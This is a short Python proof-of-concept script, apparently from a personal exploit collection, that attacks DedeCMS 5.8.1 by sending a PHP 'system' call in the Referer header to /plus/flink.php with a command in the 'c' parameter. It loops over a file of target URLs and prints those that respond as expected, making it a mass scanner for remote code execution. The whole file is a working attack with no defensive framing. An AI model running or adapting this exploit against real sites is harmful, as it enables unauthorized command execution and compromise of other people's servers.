import requests
from common.check import *
from common.open_target_url import *
#dedecmd 5.8.1预览版


def poc(url):
    target_payload = "/plus/flink.php?dopost=save&c=pwd" 
    target_url = url + target_payload
    headers = {
        'Pragma': 'no-cache',
        'Cache-Control': 'no-cache',
        'DNT': '1',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (X11; CrOS x86_64 13904.16.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.25 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7',
        'sec-gpc': '1',
        'referer': '<?php "system"($c);die;/*',
        'Connection': 'close'
    }
    try:
        res =  requests.get(target_url,headers=headers,timeout=3)
        if res.status_code == 200 and "pgo==0" in res.text:
            print(url)
    except requests.RequestException as e: #e为异常信息
        print ("请求异常：%s" %(url))

if __name__ == '__main__':
    target_path = "D://git/poccc/targets/1.txt"
    url_list = open_url_file(target_path)
    for url in url_list:
        poc(url_agreement_check(url))
